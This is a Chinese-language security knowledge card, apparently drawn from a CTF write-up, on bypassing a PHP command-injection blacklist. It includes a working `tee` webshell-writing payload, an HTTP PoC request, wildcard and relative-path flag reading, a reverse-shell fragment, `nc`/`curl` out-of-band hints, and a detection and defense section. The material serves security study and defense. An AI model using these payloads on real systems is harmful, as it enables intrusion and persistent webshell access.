---
id: web-php-rce-blacklist-no-slash-no-redirect-tee-write-webshell
title: 命令执行黑名单过滤 `/` 与 `>` 时用 `|tee` 落盘写马、用相对路径取 flag
type: scenario
domain: web
path: web/php/rce
technique: shell-blacklist-tee-write-relative-path
aliases:
- tee 写文件绕过重定向过滤
- 过滤斜杠写马
- 不支持 > 时写 webshell
- 相对路径读 flag
- 坦诚相见
tags:
- web
- php
- rce
- command-injection
- blacklist-bypass
- webshell
- tee
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:54:17+08:00'
  notes: 已对照原文核对；no.php 七条正则（\.\.\/、\/\/、%2e%2e\/、%2E%2E\\、flag、\/、>）与正文逐条一致，tee 写马命令与原文相同；与既有 base64+tee 字符集白名单卡、ping 斜杠过滤卡的触发条件差异成立；本次核对未读取图片，写马后蚁剑连接与 sudo cat flag 的成功仅见截图，未复跑
---

## 一句话结论

`system($_POST['rce'])` 前面挂了「过滤 `/`、`>`、`../`、`flag`」这类黑名单时，`>` 被拦并不等于不能写文件：改用管道把内容交给 `tee`（`echo "..."|tee 1.php`）不出现重定向符也不出现斜杠，照样在当前目录落一个一句话木马；读 flag 时同理改用不带 `/` 的相对路径（当前目录 `flag`，或 `sudo cat flag`）。

## 原理

- **过滤标的选错**：黑名单针对「路径穿越 + 重定向符」这些字样，命令执行点本身（`system`）没有任何限制，shell 的语法面远大于这几个字符——管道 `|`、引号、`$()`、通配 `*`、`&&` 都还能用。
- **`tee` 替代 `>`**：`tee` 从标准输入读数据并写入指定文件，同时把内容输出到标准输出。`echo "代码"|tee 1.php` 与 `echo "代码">1.php` 效果相同，但整条命令里没有 `>`，因此不命中「禁止写文件」的黑名单；而且 `tee` 的写入内容会回显，能直接确认写成功。
- **为什么不能带 `/`**：过滤 `/` 让 `cat /flag`、`/bin/bash -i`、`/tmp/x` 全部失效，也是「不能反弹 shell」的直接原因（`bash -i >& /dev/tcp/...` 同时含 `/` 和 `>`，两条都撞）。绕过方式是**不写绝对路径**：当前工作目录就是 Web 根，`tee 1.php`、`cat flag` 都用相对路径；若目标文件在别处，用 `*`/`?` 通配或 `cd` 逐级（`cd ..` 不含 `/`）。
- **为什么 `flag` 关键字能被绕过**：若黑名单含 `flag` 字面量，可用 `f*`、`fla?`、`cat f*`（通配符由 shell 展开，请求里不含该词）；本卡 PoC 直接用的是 `sudo cat flag`，因为黑名单只挡 `/flag` 这类绝对路径拼写。
- **前提**：Web 进程对当前目录有写权限（PHP 站点目录通常可写，否则 `tee` 报 Permission denied）；`tee` 存在（Linux 默认有，busybox 环境也有）。

## 触发条件

- 用户输入直接进入 `system`/`exec`/`shell_exec`/反引号，未做转义或白名单。
- 前置黑名单只覆盖 `/`、`>`、`../`、`flag` 等字样，没有禁用 `|`、引号、`tee`。
- Web 根目录（或当前工作目录）对 Web 进程可写，写入的文件可被 HTTP 访问。
- 目标为 Linux/类 Unix（有 `tee`、有通配符展开）。

## 利用步骤

1. 先确认注入点与过滤：提交 `id`、`|id`、`;id` 观察回显，再提交 `cat /etc/passwd` 确认 `/` 被拦（返回黑名单提示）。
2. 用 `tee` 写一句话，注意整条命令不含 `/` 与 `>`，双引号内 `$` 需转义避免被 PHP 先解析：
   ```bash
   echo "<?php eval(\$_POST[1]);"|tee 1.php
   ```
3. 访问 `http://target/1.php`，用蚁剑/冰蝎或直接 POST `1=system('id');` 执行命令，获得稳定的命令执行通道（比一次性回显更好用）。
4. 读 flag 时避开 `/`：先 `ls` 看当前目录，常见为 `cat flag`、`cat f*`；若需跨目录，用 `cd ..` 逐级或通配符。
5. 提权/横移：`find / -perm -4000 2>/dev/null` 这类命令含 `/` 会被拦，改用 `ls -l`、`cat /proc/self/status` 的替代写法或直接通过 webshell 上传脚本执行；原文是通过 webshell 连上后发现 `sudo` 带 suid，直接 `sudo cat flag`。

## PoC

```http
POST /index.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

rce=echo+"<?php+eval(\$_POST[1]);"|tee+1.php
```

```text
# 落地后访问 /1.php，POST 1=system('ls');
# 读取 flag（不含斜杠）：
rce=sudo cat flag
# 若 flag 关键字也被拦：
rce=cat f*
```

原文过滤规则（`no.php` 中被 include 的校验函数）为：`/\.\.\//`、`/\/\//`、`/%2e%2e\//`、`/%2E%2E\\/`、`/flag/`、`/\//`、`/>/`，命中即 `die`。

## 变体与关联

- **写文件的其他替代**：`|tee -a`（追加）、`dd of=1.php`（不含 `>`）、`cp`/`mv` 挪动已上传文件、`curl -o`（需外网）、PHP 侧 `file_put_contents`（若能再找到文件写入点）。
- **回显/带外**：`|nc`/`|curl`（含 `/` 时改用 `busybox nc`、`wget` 的相对调用或 `$HOSTNAME` 变量拼接）。
- **路径变体**：`cd` 逐级进入敏感目录、通配符 `f*`/`????`、`$PWD`/`$HOME` 变量、`${IFS}` 代替空格。
- 关联：`web/php/rce` 下「字符集白名单下用 base64+tee 写马」卡（那种场景禁用引号与斜杠，需要 base64 编码绕过字符集，本卡允许引号、只禁 `>` 与 `/`，触发条件与 PoC 不同）；「命令执行黑名单绕过」类卡共享同一根因：黑名单不做语法解析。
- 边界：`disable_functions` 禁用 `system`/`exec` 时本链失效（需另找函数或利用已有 webshell 上传点）；目录不可写时 `tee` 失败；若黑名单扩展到 `|`、`*`、`$`、字母组合过滤，则需换 base64 或十六进制通道。

## 检测与防御

- 检测：Web 根目录出现新的 `.php` 文件（尤其内容为一句话、创建时间与某次 POST 吻合）；请求参数里出现 `|tee`、`| dd`、`|nc`、`;`、`$(`、反引号；`system`/`exec` 调用的进程树中出现 `tee`、`sh -c`；同一 IP 在短时间内先触发黑名单告警再成功写入文件。
- 防御：不要用黑名单过滤命令执行——命令注入的正解是不拼接 shell（用参数化 API、白名单命令与参数、`escapeshellarg`）；必须执行时限制可执行命令集合并以低权限用户运行；Web 目录设只读（除上传目录）并禁用脚本执行；开启 `disable_functions`、open_basedir；对 Web 目录的文件创建做监控与只读挂载。
